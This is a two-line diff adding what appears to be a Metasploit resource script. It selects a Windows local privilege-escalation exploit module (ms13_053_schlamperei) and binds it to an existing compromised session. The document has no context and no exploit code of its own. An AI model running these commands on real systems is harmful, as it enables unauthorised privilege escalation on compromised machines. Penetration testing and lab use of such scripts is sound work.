@@ -1,0 +1,2 @@
+use exploit/windows/local/ms13_053_schlamperei
+set SESSION 1
